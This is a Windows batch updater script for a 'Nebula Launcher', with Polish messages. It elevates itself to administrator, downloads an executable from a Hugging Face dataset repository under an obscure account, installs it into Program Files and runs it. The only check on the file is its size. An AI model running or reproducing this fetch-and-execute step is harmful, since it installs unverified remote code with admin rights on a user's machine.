@echo off
chcp 65001 >nul
title Nebula Launcher Updater
setlocal EnableExtensions EnableDelayedExpansion

:: ==============================
:: ADMIN CHECK
:: ==============================
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [INFO] Wymagane uprawnienia administratora...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: ==============================
:: CONFIG
:: ==============================
set "UPDATE_URL=https://huggingface.co/datasets/qwdqdqwe/system-gier/resolve/main/Nebulauncher.exe"
set "LAUNCHER_NAME=Nebulauncher.exe"

set "INSTALL_DIR=C:\Program Files (x86)\NebulaLauncher"
set "INSTALL_EXE=%INSTALL_DIR%\%LAUNCHER_NAME%"

set "OLD_FILE=%INSTALL_DIR%\%LAUNCHER_NAME%.old"
set "TEMP_FILE=%TEMP%\nebula_update_%RANDOM%.exe"

set "USER_DIR=%USERPROFILE%\NebulaLauncher"

echo ========================================
echo  Nebula Launcher Updater v2.1
echo ========================================
echo.

echo [INFO] Dane użytkownika: %USER_DIR%
echo.

:: ==============================
:: CLEAN OLD FILE
:: ==============================
if exist "%OLD_FILE%" (
    echo [INFO] Usuwam stary plik .old...

    attrib -R -S -H "%OLD_FILE%" >nul 2>&1
    del /F /Q "%OLD_FILE%" >nul 2>&1

    if exist "%OLD_FILE%" (
        echo [WARN] Nie udalo sie usunac .old
    ) else (
        echo [OK] Usunieto .old
    )
) else (
    echo [OK] Brak .old
)

echo.

:: ==============================
:: CLOSE LAUNCHER
:: ==============================
echo [INFO] Sprawdzam launcher...

taskkill /IM "%LAUNCHER_NAME%" /F >nul 2>&1

timeout /T 2 /NOBREAK >nul

:: ==============================
:: DOWNLOAD
:: ==============================
echo [INFO] Pobieranie update...

del /F /Q "%TEMP_FILE%" >nul 2>&1

powershell -NoProfile -Command ^
"try { Invoke-WebRequest -Uri '%UPDATE_URL%' -OutFile '%TEMP_FILE%' -UseBasicParsing } catch { exit 1 }"

if not exist "%TEMP_FILE%" (
    echo [BLAD] Pobieranie nieudane
    exit /b 1
)

for %%F in ("%TEMP_FILE%") do set "SIZE=%%~zF"
echo [INFO] Rozmiar: !SIZE! bytes

if !SIZE! LSS 1000000 (
    echo [BLAD] Plik podejrzanie maly
    del /F /Q "%TEMP_FILE%" >nul 2>&1
    exit /b 1
)

echo [OK] Pobrano poprawnie
echo.

:: ==============================
:: INSTALL
:: ==============================
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" >nul 2>&1
)

if exist "%INSTALL_EXE%" (
    echo [INFO] Usuwam stara wersje...
    attrib -R -S -H "%INSTALL_EXE%" >nul 2>&1
    del /F /Q "%INSTALL_EXE%" >nul 2>&1
)

copy /Y "%TEMP_FILE%" "%INSTALL_EXE%" >nul 2>&1

if not exist "%INSTALL_EXE%" (
    echo [BLAD] Instalacja nieudana
    exit /b 1
)

echo [OK] Zainstalowano
del /F /Q "%TEMP_FILE%" >nul 2>&1

echo.

:: ==============================
:: START APP
:: ==============================
echo [INFO] Start launchera...
start "" "%INSTALL_EXE%"

echo [OK] Gotowe
exit /b 0
